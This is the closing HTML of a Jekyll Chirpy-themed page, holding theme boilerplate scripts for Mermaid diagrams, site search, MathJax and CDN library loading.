        <p class="mb-0">Using the <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>.
        </p>
      </div>
    </div>
  </div>
</footer>


    
      <!--
  mermaid-js loader
-->

<script src="https://cdn.jsdelivr.net/npm/mermaid@9.2.2/dist/mermaid.min.js"></script>

<script>
  (function () {

    function updateMermaid(event) {
      if (event.source === window && event.data &&
        event.data.direction === ModeToggle.ID) {

        const mode = event.data.message;

        if (typeof mermaid === "undefined") {
          return;
        }

        let expectedTheme = (mode === ModeToggle.DARK_MODE ? "dark" : "default");
        let config = {theme: expectedTheme};

        /* Re-render the SVG ‚Ä∫ <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $(".mermaid").each(function () {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr("data-processed");
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, ".mermaid");
      }
    }

    let initTheme = "default";

    if ($("html[data-mode=dark]").length > 0
      || ($("html[data-mode]").length == 0
        && window.matchMedia("(prefers-color-scheme: dark)").matches)) {
      initTheme = "dark";
    }

    let mermaidConf = {
      theme: initTheme  /* <default|dark|forest|neutral> */
    };

    /* Create mermaid tag */
    $("pre").has("code.language-mermaid").each(function () {
      let svgCode = $(this).children().html();
      $(this).addClass("unloaded");
      $(this).after(`<pre class=\"mermaid\">${svgCode}</pre>`);
    });

    mermaid.initialize(mermaidConf);

    window.addEventListener("message", updateMermaid);
  })();

</script>

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">A new version of content is available.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Update
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No results found.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js"></script>






  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1.11.6/dayjs.min.js,npm/dayjs@1.11.6/locale/en.min.js,npm/dayjs@1.11.6/plugin/relativeTime.min.js,npm/dayjs@1.11.6/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>


  <!-- MathJax -->
  <script>
  /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */
  MathJax = {
    tex: {
      inlineMath: [              /* start/end delimiter pairs for in-line math */
        ['$','$'],
        ['\\(','\\)']
      ],
      displayMath: [             /* start/end delimiter pairs for display math */
        ['$$', '$$'],
        ['\\[', '\\]']
      ]
    }
  };
  </script>
  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-chtml.js">
  </script>


<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

